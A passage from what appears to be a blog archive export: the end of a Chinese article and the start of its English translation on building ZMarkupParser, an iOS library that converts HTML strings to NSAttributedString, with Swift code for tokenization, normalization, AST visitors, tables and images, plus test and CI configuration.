設定 headIndent, firstLineHeadIndent, NSTextTab 實現，但是測試發現字串太長、大小有變還是無法完美呈現結果。目前只做到 Acceptable，自己組合項目清單字串 insert 到字串前。我們只使用到 NSTextList.MarkerFormat 用來產項目清單符號，而不是直接使用 NSTextList。清單符號支援列表可參考： MarkupStyleList.swift最終顯示結果：( &lt;ol&gt;&lt;li&gt; )複雜的渲染項目 — Table類似 清單項目的實現，但是是表格。在 HTML 中使用 &lt;table&gt; 表格-&gt;包裝 &lt;tr&gt; 表格列-&gt;包裝 &lt;td&gt;/&lt;th&gt; 表示表格欄位:&lt;table&gt; &lt;tr&gt; &lt;th&gt;Company&lt;/th&gt; &lt;th&gt;Contact&lt;/th&gt; &lt;th&gt;Country&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Alfreds Futterkiste&lt;/td&gt; &lt;td&gt;Maria Anders&lt;/td&gt; &lt;td&gt;Germany&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Centro comercial Moctezuma&lt;/td&gt; &lt;td&gt;Francisco Chang&lt;/td&gt; &lt;td&gt;Mexico&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;實測原生的 NSAttributedString.DocumentType.html 是用 Private macOS API NSTextBlock 來完成顯示，因此能完整顯示 HTML 表格樣式及內容。 有點作弊！我們無法用 Private API 🥲 func visit(_ markup: TableColumnMarkup) -&gt; Result { let attributedString = collectAttributedString(markup) let siblingColumns = markup.parentMarkup?.childMarkups.filter({ $0 is TableColumnMarkup }) ?? [] let position = (siblingColumns.firstIndex(where: { $0 === markup }) ?? 0) // 有無從外部指定想要的寬度, 可設 .max 不 truncated string var maxLength: Int? = markup.fixedMaxLength if maxLength == nil { // 沒指定則找到第一行同一欄的 String length 做為 max length if let tableRowMarkup = markup.parentMarkup as? TableRowMarkup, let firstTableRow = tableRowMarkup.parentMarkup?.childMarkups.first(where: { $0 is TableRowMarkup }) as? TableRowMarkup { let firstTableRowColumns = firstTableRow.childMarkups.filter({ $0 is TableColumnMarkup }) if firstTableRowColumns.indices.contains(position) { let firstTableRowColumnAttributedString = collectAttributedString(firstTableRowColumns[position]) let length = firstTableRowColumnAttributedString.string.utf16.count maxLength = length } } } if let maxLength = maxLength { // 欄位超過 maxLength 則 truncated string if attributedString.string.utf16.count &gt; maxLength { attributedString.mutableString.setString(String(attributedString.string.prefix(maxLength))+\"...\") } else { attributedString.mutableString.setString(attributedString.string.padding(toLength: maxLength, withPad: \" \", startingAt: 0)) } } if position &lt; siblingColumns.count - 1 { // 新增空白做為 spacing, 外部可指定 spacing 寬度幾個空白字 attributedString.append(makeString(in: markup, string: String(repeating: \" \", count: markup.spacing))) } return attributedString } func visit(_ markup: TableRowMarkup) -&gt; Result { let attributedString = collectAttributedString(markup) attributedString.append(makeBreakLine(in: markup)) // 新增換行, 詳細請參考 Source Code return attributedString } func visit(_ markup: TableMarkup) -&gt; Result { let attributedString = collectAttributedString(markup) attributedString.append(makeBreakLine(in: markup)) // 新增換行, 詳細請參考 Source Code attributedString.insert(makeBreakLine(in: markup), at: 0) // 新增換行, 詳細請參考 Source Code return attributedString }最終呈現效果如下圖：not perfect, but acceptable.複雜的渲染項目 — Image最終來講一個最大的魔王，載入遠端圖片到 NSAttributedString。在 HTML 中使用 &lt;img&gt; 表示圖片:&lt;img src=\"https://user-images.githubusercontent.com/33706588/219608966-20e0c017-d05c-433a-9a52-091bc0cfd403.jpg\" width=\"300\" height=\"125\"/&gt;並可透過 width / height HTML Attribute 指定想要的顯示大小。在 NSAttributedString 中顯示圖片，比想像中複雜很多；且沒有很好的實現，之前做 UITextView 文繞圖 時有稍微踩過坑，但這次在研究一輪發現還是沒有一個完美的解決方案。目前先忽略 NSTextAttachment 原生不能 reuse 釋放記憶體的問題，先只實現從遠端下載圖片放到 NSTextAttachment 在放到 NSAttributedString 中，並實現自動更新內容。此系列操作又再拆到另一個小的 Project 實現，想說日後比較好優化跟復用到其他 Project:主要是參考 Asynchronous NSTextAttachments 這系列文章實現，但是替換了最後的更新內容部分(下載完後要刷新 UI 才會呈現)還有增加 Delegate/DataSource 給外部擴充使用。運做流程與關係如上圖 宣告 ZNSTextAttachmentable 物件，封裝 NSTextStorage 物件(UITextView自帶)及 UILabel 本身 (UILabel 無 NSTextStorage)操作方法僅為實現 replace attributedString from NSRange. ( func replace(attachment: ZNSTextAttachment, to: ZResizableNSTextAttachment) ) 實現原理是先使用 ZNSTextAttachment 包裝 imageURL、PlaceholderImage、顯要顯示的大小資訊，然後先用 placeHolder 直接顯示圖片 當 系統需要此圖片在畫面時會呼叫 image(forBounds… 方法，此時我們開始下載 Image Data DataSource 出去讓外部可決定怎麼下載或實現 Image Cache Policy，預設直接使用 URLSession 請求圖片 Data 下載完成後 new 一個新的 ZResizableNSTextAttachment 並在 attachmentBounds(for… 實現自定圖片大小的邏輯 呼叫 replace(attachment: ZNSTextAttachment, to: ZResizableNSTextAttachment) 方法，將 ZNSTextAttachment 位置替換為 ZResizableNSTextAttachment 發出 didLoad Delegate 通知，讓外部有需要時可串接 完成 詳細程式碼可參考 Source Code 。不使用 NSLayoutManager.invalidateLayout(forCharacterRange: range, actualCharacterRange: nil) 、 NSLayoutManager.invalidateDisplay(forCharacterRange: range) 刷新 UI 的原因是發現 UI 沒有正確的顯示更新；既然都知道所在 Range 了，直接觸發取代 NSAttributedString，能確保 UI 正確更新。最終顯示結果如下：&lt;span style=\"color:red\"&gt;こんにちは&lt;/span&gt;こんにちはこんにちは &lt;br /&gt;&lt;img src=\"https://user-images.githubusercontent.com/33706588/219608966-20e0c017-d05c-433a-9a52-091bc0cfd403.jpg\"/&gt;Testing &amp; Continuous Integration這次專案除了撰寫 Unit Test 單元測試之外還建立了 Snapshot Test 做整合測試方便對最終的 NSAttributedString 做綜觀的測試比較。主要功能邏輯都有 UnitTests 並加上整合測試，最終 Test Coverage 在 85% 左右。ZMarkupParser — codecovSnapshot Test直接引入框架使用:import SnapshotTesting// ...func testShouldKeppNSAttributedString() { let parser = ZHTMLParserBuilder.initWithDefault().build() let textView = UITextView() textView.frame.size.width = 390 textView.isScrollEnabled = false textView.backgroundColor = .white textView.setHtmlString(\"html string...\", with: parser) textView.layoutIfNeeded() assertSnapshot(matching: textView, as: .image, record: false)}// ...直接比對最終結果是否符合預期，確保調整整合起來沒有異常。Codecov Test Coverage串接 Codecov.io (free for Public Repo) 評估 Test Coverage，只需安裝 Codecov Github App &amp; 設計即可。Codecov &lt;-&gt; Github Repo 設定好後，也可以在專案根目錄加上 codecov.ymlcomment: # this is a top-level key layout: \"reach, diff, flags, files\" behavior: default require_changes: false # if true: only post the comment if coverage changes require_base: no # [yes :: must have a base report to post] require_head: yes # [yes :: must have a head report to post]設定檔，這樣可以啟用每個 PR 發出後，自動把 CI 跑的結果 Comment 到內容。Continuous IntegrationGithub Action, CI 整合: ci.ymlname: CIon: workflow_dispatch: pull_request: types: [opened, reopened] push: branches: - mainjobs: build: runs-on: self-hosted steps: - uses: actions/checkout@v3 - name: spm build and test run: | set -o pipefail xcodebuild test -workspace ZMarkupParser.xcworkspace -testPlan ZMarkupParser -scheme ZMarkupParser -enableCodeCoverage YES -resultBundlePath './scripts/TestResult.xcresult' -destination 'platform=iOS Simulator,name=iPhone 14,OS=16.1' build test | xcpretty - name: Codecov uses: codecov/codecov-action@v3.1.1 with: xcode: true xcode_archive_path: './scripts/TestResult.xcresult'此設定是在 PR opened/reopend or push main branch 時跑 build and test 最後把 test coverage 報告上傳到 codecov.Regex關於正規表示法，每用到一次就又再精進一次；這次實際沒用到太多，但是因為本來想用一個正則挖出成對的 HTML Tag 所以也多研究過要怎麼撰寫。一些這次新學習的 cheat sheet 筆記… ?: 可以讓 ( ) 匹配 group 結果，但不會捕獲返回e.g. (?:https?:\\/\\/)?(?:www\\.)?example\\.com 在 https://www,example.com 會返回整個網址而不是 https:// , www .+? 非貪婪的匹配 (找到最近的就返回)e.g. &lt;.+?&gt; 在 &lt;a&gt;test&lt;/a&gt; 會返回 &lt;a&gt; , &lt;/a&gt; 而非整個字串 (?=XYZ) 任何字串直到 XYZ 字串出現；要注意，另一個與之相似的 [^XYZ] 是代表任何字串直到 X or Y or Z 字元出現e.g. (?:__)(.+?(?=__))(?:__) (任何字串直到 __ ) 會匹配出 test ?R 遞迴往內找一樣規則的值e.g. \\((?:[^()]|((?R)))+\\) 在 (simple) (and(nested)) 會匹配出 (simple) , (and(nested)) , (nested) ?&lt;GroupName&gt; … \\k&lt;GroupName&gt; 匹配前面的 Group Namee.g. (?&lt;tagName&gt;&lt;a&gt;).*(\\k&lt;GroupName&gt;) (?(X)yes|no) 第 X 個匹配結果有值(也可以用 Group Name)時則匹配後面條件 yes 否則匹配 no Swift 暫時不支援其他 Regex 好文： Swift 正则速查手册 正则表达式是如何运作的？ -&gt; 後續優化此專案的正則效能時可參考 Regex 錯誤導致無窮尋找，最終引發伺服器故障的案例 Regex101 右下方可查詢所有正則規則Swift Package Manager &amp; Cocoapods這也是我第一次開發 SPM &amp; Cocoapods…蠻有趣的，SPM 真的方便；但是踩到同時兩個專案依賴同個套件的話，同時開兩個專案會有其中一個找不到該套件然後 Build 不起來。。。Cocoapods 有上傳 ZMarkupParser 但沒測試正不正常，因為我是用 SPM 😝。ChatGPT實際搭配開發體驗下來，覺得只有在協助潤稿 Readme 時最有用；在開發上目前沒體會到有感的地方；因為詢問 mid-senior 以上的問題，他也給不出個確切答案甚是是錯誤的答案 (有遇到問他一些正則規則，答案不太正確)，所以最後還是回到 Google 人工找正確解答。更不要說請他寫 Code 了，除非是簡單的 Code Gen Object；不然不要幻想他能直接完成整個工具架構。 (至少目前是這樣，感覺寫 Code 這塊 Copilot 可能更有幫助)但他可以給一些知識盲區的大方向，讓我們能快速大略知道某些地方應該會怎麼做；有的時候掌握度太低，在 Google 反而很難快速定位到正確的方向，這時候 ChatGPT 就蠻有幫助的。聲明歷經三個多月的研究及開發，已疲憊不堪，但還是要聲明一下此做法僅為我研究後得到的可行結果，不一定是最佳解，或還有可優化的地方，這專案更像是一個拋磚引玉，希望能得到一個 Markup Language to NSAttributedString 的完美解答， 非常歡迎大家貢獻；有許多事項還需要群眾的力量才能完善 。ContributingZMarkupParser ⭐這邊先列一些此時此刻(2023/03/12)想到能更好的地方，之後會在 Repo 上紀錄： 效能/算法的優化，雖然比原生 NSAttributedString.DocumentType.html 快速且穩定；但還有需多優化空間，我相信效能絕對不如 XMLParser；希望有朝一日能有同樣的效能但又能保持客製化及自動修正容錯 支援更多 HTML Tag、Style Attribute 轉換解析 ZNSTextAttachment 再優化，實現 reuse 能，釋放記憶體；可能要研究 CoreText 支援 Markdown 解析，因底層抽象其實不局限於 HTML；所以只要建好前面的 Markdown 轉 Markup 物件就能完成 Markdown 解析；因此我取名叫 ZMarkupParser，而不是 ZHTMLParser，就是希望有朝一日也能支援 Markdown to NSAttributedString 支援 Any to Any, e.g. HTML To Markdown, Markdown To HTML，因我們有原始的 AST 樹(Markup 物件)，所以實現任意 Markup 間的轉換是有機會的 實現 css !important 功能，加強抽象 MarkupStyle 的繼承策略 加強 HTML Selector 功能，目前只是最粗淺的 filter 功能 好多好多, 歡迎開 issue 如果您心有餘而力不足，也可以透過給我一顆 ⭐ 讓 Repo 可以被更多人看見，進而讓 Github 大神有機會協助貢獻！總結ZMarkupParser以上就是我開發 ZMarkupParser 的所有技術細節及心路歷程，花費了我快三個月的下班及假日時間，無數的研究及實踐過程，到撰寫測試、提升 Test Coverage、建立 CI；最後才有一個看起來有點樣子的成果；希望這個工具有解決掉有相同困擾的朋友，也希望大家能一起讓這個工具變得更好。pinkoi.com目前有應用在敝司 pinkoi.com 的 iOS 版 App 上，沒有發現問題。😄延伸閱讀 ZMarkupParser HTML String 轉換 NSAttributedString 工具 String Rendering Asynchronous NSTextAttachments有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,233 Total Views Last Statistics Date: 2025-08-15 | 1,231 Views on Medium." }, { "title": "The Journey of Building a Custom HTML Parser", "url": "/posts/zrealm-dev/en/the-journey-of-building-a-custom-html-parser-2724f02f6e7/", "categories": "ZRealm Dev.", "tags": "ios-app-development, html-parsing, nsattributedstring, html, rendering", "date": "2023-03-12 01:09:22 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版The Journey of Building a Custom HTML ParserA detailed account of developing the ZMa...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版The Journey of Building a Custom HTML ParserA detailed account of developing the ZMarkupParser HTML to NSAttributedString rendering engine.This article covers the tokenization of HTML strings, normalization processes, the generation of an Abstract Syntax Tree, the application of the Visitor and Builder patterns, and some additional thoughts.ContinuationLast year, I published an article titled “TL;DR on Implementing iOS NSAttributedString HTML Rendering,” which briefly introduced how to use XMLParser to parse HTML and convert it into NSAttributedString.Key. The structure and ideas presented in that article were quite scattered, as it was more of a record of the issues I encountered at the time, and I didn’t spend much time researching the topic.Convert HTML String to NSAttributedStringRevisiting this topic, we need a way to convert HTML strings provided by the API into NSAttributedString and apply the corresponding styles for display in UITextView/UILabel.For example, &lt;b&gt;Test&lt;a&gt;Link&lt;/a&gt;&lt;/b&gt; should be displayed as Test Link. Note 1: It is not recommended to use HTML as a rendering medium for communication between the app and data, as the HTML specification is too flexible. The app cannot support all HTML styles, and there is no official HTML conversion rendering engine. Note 2: Starting from iOS 14, you can use the official native AttributedString to parse Markdown or import the apple/swift-markdown Swift Package to parse Markdown. Note 3: Due to the large scale of our company’s project and the long-standing use of HTML as a medium, we cannot fully switch to Markdown or other markup languages at this time. Note 4: The HTML here is not intended to display an entire HTML webpage; it is merely used as a styled Markdown rendering string. (To render a full page of complex HTML, including images and tables, you still need to use WebView to load HTML.) I strongly recommend using Markdown as the string rendering medium. If your project faces similar challenges and you have to use HTML without an elegant tool for converting to NSAttributedString, then please proceed with caution. Friends who remember the previous article can jump directly to the ZhgChgLi / ZMarkupParser section.NSAttributedString.DocumentType.htmlMost methods found online for converting HTML to NSAttributedString involve directly using the options provided by NSAttributedString to render HTML. Here’s an example:let htmlString = \"&lt;b&gt;Test&lt;a&gt;Link&lt;/a&gt;&lt;/b&gt;\"let data = htmlString.data(using: String.Encoding.utf8)!let attributedOptions: [NSAttributedString.DocumentReadingOptionKey: Any] = [ .documentType: NSAttributedString.DocumentType.html, .characterEncoding: String.Encoding.utf8.rawValue]let attributedString = try! NSAttributedString(data: data, options: attributedOptions, documentAttributes: nil)Problems with this approach: Poor performance: This method renders styles through the WebView Core and then switches back to the Main Thread for UI display; rendering over 300 characters takes about 0.03 seconds. Text loss: For example, marketing copy might use &lt;Congratulation!&gt;, which would be treated as an HTML tag and removed. Lack of customization: For instance, you cannot specify the degree of boldness for bold HTML in NSAttributedString. Random crashes starting from iOS 12 with no official solution. A significant number of crashes appeared in iOS 15, with tests showing that under low battery conditions, it crashes 100% of the time (fixed in iOS ≥ 15.2). Long strings cause crashes; testing shows that inputting strings longer than 54,600 characters results in a 100% crash (EXC_BAD_ACCESS).The most painful issue for us remains the crashing problem. From the release of iOS 15 until the fix in 15.2, our app was consistently plagued by this issue. Data shows that from March 11, 2022, to June 8, 2022, it caused over 2.4K crashes, affecting more than 1.4K users.This crashing issue has existed since iOS 12, and iOS 15 merely encountered a larger pitfall. However, I suspect that the fix in iOS 15.2 is just a patch; the official team cannot eradicate the root cause.The next issue is performance. As a markup language for string styles, it is heavily used in UILabel/UITextView throughout the app. As mentioned earlier, rendering a single label takes 0.03 seconds, and multiplying that across a list of UILabels/UITextViews can lead to noticeable lag in user interactions.XMLParserThe second solution is to use XMLParser to parse the HTML into corresponding NSAttributedString keys and apply styles, as introduced in the previous article.You can refer to the implementation of SwiftRichString and the content of the previous article for more details. The previous article only explored the possibility of using XMLParser to parse HTML and perform corresponding conversions, completing an experimental implementation without designing it as a well-structured and extensible “tool.”Problems with this approach: Zero fault tolerance: HTML like &lt;br&gt;, &lt;Congratulation!&gt;, and &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/b&gt;Italic&lt;/i&gt; can lead to errors in XMLParser, throwing an error and displaying a blank result. When using XMLParser, the HTML string must strictly adhere to XML rules, unlike browsers or NSAttributedString.DocumentType.html, which can display with some fault tolerance.Standing on the Shoulders of GiantsNeither of the above solutions perfectly and elegantly solves the HTML problem, so I began searching for existing solutions. johnxnguyen / Down only supports converting Markdown to Any (XML/NSAttributedString…) but does not support converting HTML. malcommac / SwiftRichString uses XMLParser under the hood, and tests show that it has the same zero fault tolerance issues as mentioned earlier. scinfu / SwiftSoup only supports HTML parsing (Selector) and does not support conversion to NSAttributedString as noted in this issue. After searching extensively, I found that the results were similar to the projects mentioned above. There were no giants’ shoulders to stand on.ZhgChgLi/ZMarkupParserWith no giants’ shoulders to rely on, I had to become the giant myself and developed a tool to convert HTML strings to NSAttributedString.Developed entirely in Swift, it uses Regex to parse HTML tags and undergoes tokenization, analyzing and correcting tag validity (fixing missing end tags and misaligned tags), converting to an abstract syntax tree, and finally using the Visitor Pattern to map HTML tags to abstract styles, resulting in the final NSAttributedString. This tool does not rely on any parser libraries.Features Supports HTML rendering (to NSAttributedString), stripping HTML tags, and selector functionality. Higher performance than NSAttributedString.DocumentType.html. Automatically analyzes and corrects tag validity (fixing missing end tags and misaligned tags). Supports dynamic style settings from style=\"color:red...\". Allows customization of style specifications, such as how bold a bold tag should be. Supports flexible extensibility for tags or custom tags and attributes. For detailed introduction and installation instructions, please refer to this article: “ZMarkupParser HTML String to NSAttributedString Tool”.You can directly git clone the project and open the ZMarkupParser.xcworkspace project, selecting the ZMarkupParser-Demo target to build and run it for experimentation.ZMarkupParserTechnical DetailsNext, I want to share the technical details regarding the development of this tool.The above image illustrates the general operation process. Subsequent articles will introduce each step and include code snippets. ⚠️️️️️️ This article will simplify demo code, reduce abstraction, and focus on explaining the operational principles. For the final results, please refer to the project source code.Code Implementation — Tokenization a.k.a. parser, parsingWhen it comes to HTML rendering, the most crucial aspect is the parsing stage. Previously, I used XMLParser to treat HTML as XML for parsing; however, it couldn’t overcome the fact that everyday HTML usage is not 100% XML-compliant, leading to parser errors and an inability to dynamically correct them.After ruling out the use of XMLParser, the only option left in Swift was to use Regex for matching and parsing.Initially, I thought I could directly use regex to extract “paired” HTML tags and recursively search for HTML tags layer by layer until completion. However, this approach does not address the nesting of HTML tags or the need for fault tolerance for misaligned tags. Therefore, we changed our strategy to extract “single” HTML tags, recording whether they are start tags, close tags, or self-closing tags, along with other string combinations to form the parsing result array.The Tokenization Structure is as follows:enum HTMLParsedResult { case start(StartItem) // &lt;a&gt; case close(CloseItem) // &lt;/a&gt; case selfClosing(SelfClosingItem) // &lt;br/&gt; case rawString(NSAttributedString)}extension HTMLParsedResult { class SelfClosingItem { let tagName: String let tagAttributedString: NSAttributedString let attributes: [String: String]? init(tagName: String, tagAttributedString: NSAttributedString, attributes: [String : String]?) { self.tagName = tagName self.tagAttributedString = tagAttributedString self.attributes = attributes } } class StartItem { let tagName: String let tagAttributedString: NSAttributedString let attributes: [String: String]? // Start Tag may be an abnormal HTML Tag or normal text e.g. &lt;Congratulation!&gt;. After normalization, if it is found to be an isolated Start Tag, it will be marked as True. var isIsolated: Bool = false init(tagName: String, tagAttributedString: NSAttributedString, attributes: [String : String]?) { self.tagName = tagName self.tagAttributedString = tagAttributedString self.attributes = attributes } // For subsequent normalization automatic correction func convertToCloseParsedItem() -&gt; CloseItem { return CloseItem(tagName: self.tagName) } // For subsequent normalization automatic correction func convertToSelfClosingParsedItem() -&gt; SelfClosingItem { return SelfClosingItem(tagName: self.tagName, tagAttributedString: self.tagAttributedString, attributes: self.attributes) } } class CloseItem { let tagName: String init(tagName: String) { self.tagName = tagName } }}The regex used is as follows:&lt;(?:(?&lt;closeTag&gt;\\/)?(?&lt;tagName&gt;[A-Za-z0-9]+)(?&lt;tagAttributes&gt;(?:\\s*(\\w+)\\s*=\\s*([\"|']).*?\\5)*)\\s*(?&lt;selfClosingTag&gt;\\/)?&gt;)-&gt; Online Regex101 Playground closeTag: Matches &lt; / a&gt; tagName: Matches &lt; a &gt; or , &lt;/ a &gt; tagAttributes: Matches &lt;a href=”https://zhgchg.li” style=”color:red” &gt; selfClosingTag: Matches &lt;br / &gt; *This regex can still be optimized further; I will address that later. The latter part of the article provides additional information about regex for those interested.Putting it all together:var tokenizationResult: [HTMLParsedResult] = []let expression = try? NSRegularExpression(pattern: pattern, options: expressionOptions)let attributedString = NSAttributedString(string: \"&lt;a&gt;Li&lt;b&gt;nk&lt;/a&gt;Bold&lt;/b&gt;\")let totalLength = attributedString.string.utf16.count // utf-16 support emojivar lastMatch: NSTextCheckingResult?// Start Tags Stack, First In Last Out (FILO)// Check if the HTML string requires subsequent normalization to correct misalignment or add Self-Closing Tagsvar stackStartItems: [HTMLParsedResult.StartItem] = []var needForamatter: Bool = falseexpression.enumerateMatches(in: attributedString.string, range: NSMakeRange(0, totalLength)) { match, _, _ in if let match = match { // Check the string between tags or the string before the first tag // e.g. Test&lt;a&gt;Link&lt;/a&gt;zzz&lt;b&gt;bold&lt;/b&gt;Test2 - &gt; Test,zzz let lastMatchEnd = lastMatch?.range.upperBound ?? 0 let currentMatchStart = match.range.lowerBound if currentMatchStart &gt; lastMatchEnd { let rawStringBetweenTag = attributedString.attributedSubstring(from: NSMakeRange(lastMatchEnd, (currentMatchStart - lastMatchEnd))) tokenizationResult.append(.rawString(rawStringBetweenTag)) } // &lt;a href=\"https://zhgchg.li\"&gt;, &lt;/a&gt; let matchAttributedString = attributedString.attributedSubstring(from: match.range) // a, a let matchTag = attributedString.attributedSubstring(from: match.range(withName: \"tagName\"))?.string.trimmingCharacters(in: .whitespacesAndNewlines).lowercased() // false, true let matchIsEndTag = matchResult.attributedString(from: match.range(withName: \"closeTag\"))?.string.trimmingCharacters(in: .whitespacesAndNewlines) == \"/\" // href=\"https://zhgchg.li\", nil // Use regex to further extract HTML attributes, to [String: String], please refer to Source Code let matchTagAttributes = parseAttributes(matchResult.attributedString(from: match.range(withName: \"tagAttributes\"))) // false, false let matchIsSelfClosingTag = matchResult.attributedString(from: match.range(withName: \"selfClosingTag\"))?.string.trimmingCharacters(in: .whitespacesAndNewlines) == \"/\" if let matchAttributedString = matchAttributedString, let matchTag = matchTag { if matchIsSelfClosingTag { // e.g. &lt;br/&gt; tokenizationResult.append(.selfClosing(.init(tagName: matchTag, tagAttributedString: matchAttributedString, attributes: matchTagAttributes))) } else { // e.g. &lt;a&gt; or &lt;/a&gt; if matchIsEndTag { // e.g. &lt;/a&gt; // Retrieve the position of the same TagName from the Stack, starting from the last if let index = stackStartItems.lastIndex(where: { $0.tagName == matchTag }) { // If it's not the last one, it indicates there is a misalignment or a missing closing tag if index != stackStartItems.count - 1 { needForamatter = true } tokenizationResult.append(.close(.init(tagName: matchTag))) stackStartItems.remove(at: index) } else { // Extra close tag e.g &lt;/a&gt; // Does not affect subsequent processing, simply ignore } } else { // e.g. &lt;a&gt; let startItem: HTMLParsedResult.StartItem = HTMLParsedResult.StartItem(tagName: matchTag, tagAttributedString: matchAttributedString, attributes: matchTagAttributes) tokenizationResult.append(.start(startItem)) // Push to Stack stackStartItems.append(startItem) } } } lastMatch = match }}// Check the RawString at the end// e.g. Test&lt;a&gt;Link&lt;/a&gt;Test2 - &gt; Test2if let lastMatch = lastMatch { let currentIndex = lastMatch.range.upperBound if totalLength &gt; currentIndex { // There are remaining strings let resetString = attributedString.attributedSubstring(from: NSMakeRange(currentIndex, (totalLength - currentIndex))) tokenizationResult.append(.rawString(resetString)) }} else { // lastMatch = nil, indicating no tags were found, all are plain text let resetString = attributedString.attributedSubstring(from: NSMakeRange(0, totalLength)) tokenizationResult.append(.rawString(resetString))}Here’s the translated text in naturalistic English while preserving the original markdown image sources:Check if the Stack is empty. If it isn’t, it means there are Start Tags without corresponding End Tags, which should be marked as isolated Start Tags.for stackStartItem in stackStartItems { stackStartItem.isIsolated = true needForamatter = true}print(tokenizationResult)// [// .start(\"a\",[\"href\":\"https://zhgchg.li\"])// .rawString(\"Li\")// .start(\"b\",nil)// .rawString(\"nk\")// .close(\"a\")// .rawString(\"Bold\")// .close(\"b\")// ]The operation flow is shown in the image above.In the end, we will obtain a Tokenization result array. Corresponding to the source code in HTMLStringToParsedResultProcessor.swift implementation.Normalization Also known as Formatter, normalization.After obtaining the preliminary parsing results in the previous step, if we find that normalization is still needed during the parsing, this step is required to automatically correct HTML Tag issues.There are three types of HTML Tag issues: HTML Tag missing a Close Tag: for example, &lt;br&gt; Regular text being treated as an HTML Tag: for example, &lt;Congratulation!&gt; HTML Tag misalignment issues: for example, &lt;a&gt;Li&lt;b&gt;nk&lt;/a&gt;Bold&lt;/b&gt;The correction method is quite simple; we need to traverse the elements of the Tokenization result and attempt to fill in the gaps.The operation flow is shown in the image above.var normalizationResult = tokenizationResult// Start Tags Stack, First In Last Out (FILO)var stackExpectedStartItems: [HTMLParsedResult.StartItem] = []var itemIndex = 0while itemIndex &lt; newItems.count { switch newItems[itemIndex] { case .start(let item): if item.isIsolated { // If it is an isolated Start Tag if WC3HTMLTagName(rawValue: item.tagName) == nil &amp;&amp; (item.attributes?.isEmpty ?? true) { // If it is not a W3C defined HTML Tag &amp; has no HTML Attributes // Refer to the WC3HTMLTagName Enum in the Source Code // Considered as regular text treated as an HTML Tag // Change to raw string type normalizationResult[itemIndex] = .rawString(item.tagAttributedString) } else { // Otherwise, change to self-closing tag, e.g. &lt;br&gt; -&gt; &lt;br/&gt; normalizationResult[itemIndex] = .selfClosing(item.convertToSelfClosingParsedItem()) } itemIndex += 1 } else { // Normal Start Tag, add to Stack stackExpectedStartItems.append(item) itemIndex += 1 } case .close(let item): // Encounter Close Tag // Get the Tags between the Start Stack Tag and this Close Tag // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/a&gt;&lt;/u&gt;&lt;/b&gt; -&gt; gap 0 // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/a&gt;&lt;/u&gt;&lt;/b&gt; -&gt; gap b,u let reversedStackExpectedStartItems = Array(stackExpectedStartItems.reversed()) guard let reversedStackExpectedStartItemsOccurredIndex = reversedStackExpectedStartItems.firstIndex(where: { $0.tagName == item.tagName }) else { itemIndex += 1 continue } let reversedStackExpectedStartItemsOccurred = Array(reversedStackExpectedStartItems.prefix(upTo: reversedStackExpectedStartItemsOccurredIndex)) // Gap 0 means the tag is not misaligned guard reversedStackExpectedStartItemsOccurred.count != 0 else { // It's a pair, pop stackExpectedStartItems.removeLast() itemIndex += 1 continue } // If there are other gaps, automatically insert the missing Tags // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/a&gt;&lt;/u&gt;&lt;/b&gt; -&gt; // e.g &lt;a&gt;&lt;u&gt;&lt;b&gt;[CurrentIndex]&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;b&gt;&lt;/u&gt;&lt;/u&gt;&lt;/b&gt; let stackExpectedStartItemsOccurred = Array(reversedStackExpectedStartItemsOccurred.reversed()) let afterItems = stackExpectedStartItemsOccurred.map({ HTMLParsedResult.start($0) }) let beforeItems = reversedStackExpectedStartItemsOccurred.map({ HTMLParsedResult.close($0.convertToCloseParsedItem()) }) normalizationResult.insert(contentsOf: afterItems, at: newItems.index(after: itemIndex)) normalizationResult.insert(contentsOf: beforeItems, at: itemIndex) itemIndex = newItems.index(after: itemIndex) + stackExpectedStartItemsOccurred.count // Update Start Stack Tags // e.g. -&gt; b,u stackExpectedStartItems.removeAll { startItem in return reversedStackExpectedStartItems.prefix(through: reversedStackExpectedStartItemsOccurredIndex).contains(where: { $0 === startItem }) } case .selfClosing, .rawString: itemIndex += 1 }}print(normalizationResult)// [// .start(\"a\",[\"href\":\"https://zhgchg.li\"])// .rawString(\"Li\")// .start(\"b\",nil)// .rawString(\"nk\")// .close(\"b\")// .close(\"a\")// .start(\"b\",nil)// .rawString(\"Bold\")// .close(\"b\")// ] Corresponding to the source code in HTMLParsedResultFormatterProcessor.swift implementation.Abstract Syntax Tree Also known as AST, Abstract Tree.After completing the data preprocessing with Tokenization &amp; Normalization, we will now convert the results into an abstract tree 🌲.As shown in the image above.Converting to an abstract tree allows us to facilitate future operations and expansions, such as implementing Selector functionality or performing other transformations, like HTML to Markdown; or if we want to add Markdown to NSAttributedString in the future, we just need to implement Markdown’s Tokenization &amp; Normalization to achieve it.First, we define a Markup Protocol with Child &amp; Parent properties to record information about leaves and branches:protocol Markup: AnyObject { var parentMarkup: Markup? { get set } var childMarkups: [Markup] { get set } func appendChild(markup: Markup) func prependChild(markup: Markup) func accept&lt;V: MarkupVisitor&gt;(_ visitor: V) -&gt; V.Result}extension Markup { func appendChild(markup: Markup) { markup.parentMarkup = self childMarkups.append(markup) } func prependChild(markup: Markup) { markup.parentMarkup = self childMarkups.insert(markup, at: 0) }}Additionally, we use the Visitor Pattern to define each style property as an object Element, and through different Visit strategies, we can obtain individual application results.protocol MarkupVisitor { associatedtype Result func visit(markup: Markup) -&gt; Result func visit(_ markup: RootMarkup) -&gt; Result func visit(_ markup: RawStringMarkup) -&gt; Result func visit(_ markup: BoldMarkup) -&gt; Result func visit(_ markup: LinkMarkup) -&gt; Result //...}extension MarkupVisitor { func visit(markup: Markup) -&gt; Result { return markup.accept(self) }}Basic Markup Nodes:// Root Nodefinal class RootMarkup: Markup { weak var parentMarkup: Markup? = nil var childMarkups: [Markup] = [] func 